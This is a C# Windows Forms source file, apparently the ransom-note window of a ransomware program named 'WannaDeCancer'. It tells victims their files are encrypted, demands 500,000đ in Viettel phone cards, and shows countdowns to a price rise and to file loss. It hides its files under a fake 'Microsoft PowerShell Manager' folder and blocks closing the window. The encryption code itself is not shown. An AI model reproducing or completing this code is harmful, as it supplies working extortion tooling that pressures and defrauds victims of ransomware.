using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using System.IO;

namespace WannaDeCancer
{
    public partial class GUIMain : Form
    {
        #region Field
        DateTimeConverter dateTimeConverter;
        DateTime raise;
        DateTime lost;
        Thread expireCountDown;
        bool isTimeCorrect = true;
        #endregion

        #region Contructor
        public GUIMain()
        {
            InitializeComponent();
            CustomInit();
        }
        #endregion


        #region Method
        private void CustomInit()
        {
            //Each time the combobox change value, trigger the Decription()
            Description();
            cbxLang.TextChanged += CbxLang_TextChanged;

            //Time
            DateTimeCalculate();
            dateTimeConverter = new DateTimeConverter();
            ReadTimeInfoFromFile();
            expireCountDown = new Thread(TimeCountDown);
            if (isTimeCorrect)
                expireCountDown.Start();
            else
            {
                lbLostTimeLeft.Text = "Invaild Format!!!";
                lbRaiseTimeLeft.Text = "Invaild Format!!!";
            }

        }

        private void DateTimeCalculate()
        {
            //Check if the time information was created or not
            if (!File.Exists(@"C:\Program Files\Microsoft PowerShell Manager\DateInfo.txt"))
            {
                DateTime dt = DateTime.Now;
                string stream = "Start: " + dt + "\r\nRaise: ";
                dt = dt.AddDays(3);
                stream += dt + "\r\nLost: ";
                dt = dt.AddDays(4);
                stream += dt;
                Static.StringtoFile(stream, @"C:\Program Files\Microsoft PowerShell Manager\DateInfo.txt");
            }

            //Get the time information
            string getTime = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\DateInfo.txt", EncodeType.UTF);
            string[] split = getTime.Split('\r');

            for (int i = 1; i < split.Length; i++)
            {
                split[i].Substring(1);
            }
            lbRaiseExpired.Text = split[1].Substring(7);
            lbLostExpire.Text = split[2].Substring(7);
        }

        

        /// <summary>
        /// Change the txbDecription to desired Languges
        /// </summary>
        private void Description()
        {
            //Des
            switch (cbxLang.Text)
            {
                case "English":
                    txbDescription.Text = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\EN.txt", EncodeType.UTF);
                    lbTitle.Text = "Oooops, your file has been encrypted!";
                    lbDesLost.Text = "Your File will lost on:";
                    lbDesRaise.Text = "Payment Will Raise on:";
                    lbDesTimeLeftRaise.Text = "Time Left:";
                    lbDesTimeLeftLost.Text = "Time Left: ";
                    lbSend.Text = "Send 500.000đ Viettel card include your decrypt id";
                    break;
                case "VN":
                    txbDescription.Text = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\VI.txt", EncodeType.Unicode);
                    lbTitle.Text = "Ôiiiiiiiiiii! File của bạn đã bị mã hóa";
                    lbDesLost.Text = "File của bạn sẽ bị mất vào:";
                    lbDesRaise.Text = "Tăng giá vào:";
                    lbDesTimeLeftRaise.Text = "Thời gian còn lại:";
                    lbDesTimeLeftLost.Text = "Thời gian còn lại: ";
                    lbSend.Text = "Gửi 500.000đ Thẻ Viettel bao gồm id giải mã hóa";
                    break;
                case "日本語":
                    //ko co wifi dich sau
                    txbDescription.Text = Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\JP.txt", EncodeType.Unicode);
                    lbTitle.Text = "Ôiiiiiiiiiii! File của bạn đã bị mã hóa";
                    lbDesLost.Text = "File của bạn sẽ bị mất vào:";
                    lbDesRaise.Text = "Tăng giá vào:";
                    lbDesTimeLeftRaise.Text = "Thời gian còn lại:";
                    lbDesTimeLeftLost.Text = "Thời gian còn lại: ";
                    lbSend.Text = "Gửi 500.000đ Thẻ Viettel bao gồm id giải mã hóa";
                    break;
                default:
                    break;
            }
            


        }

        private void TimeCountDown()
        {
            while (true)
            {
                // Minus
                TimeSpan raiseCountDown = raise - DateTime.Now;
                TimeSpan lostCountDown = lost - DateTime.Now;

                // Set the label text = timeSpan
                lbRaiseTimeLeft.Text = raiseCountDown.ToString().Substring(0, raiseCountDown.ToString().LastIndexOf('.'));
                lbLostTimeLeft.Text = lostCountDown.ToString().Substring(0, lostCountDown.ToString().LastIndexOf('.'));
            }
        }

        private void ReadTimeInfoFromFile()
        {
            try
            {
                raise = (DateTime)dateTimeConverter.ConvertFromString(Static.SplitLineFromString(Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\DateInfo.txt", EncodeType.UTF))[1].Substring(7));
                lost = (DateTime)dateTimeConverter.ConvertFromString(Static.SplitLineFromString(Static.StreamtoString(@"C:\Program Files\Microsoft PowerShell Manager\DateInfo.txt", EncodeType.UTF))[2].Substring(7));
            }
            catch
            {
                //If the file is corrupted or wring format, the DateTime is set to today and
                //the MessageBox will show up that your file is Corrputed and cant cant be recover
                isTimeCorrect = false;
                raise = DateTime.Now;
                raise = DateTime.Now;
                MessageBox.Show("The time file has been corrupted so we can't recover your files\r\nContract via send window to get help and validate!");
            }
        }

        #endregion

        #region Event Handler
        private void GUIMain_FormClosing(object sender, FormClosingEventArgs e)
        {
            e.Cancel = true;
        }
        private void CbxLang_TextChanged(object sender, EventArgs e)
        {
            Description();
        }
        #endregion
    }
}
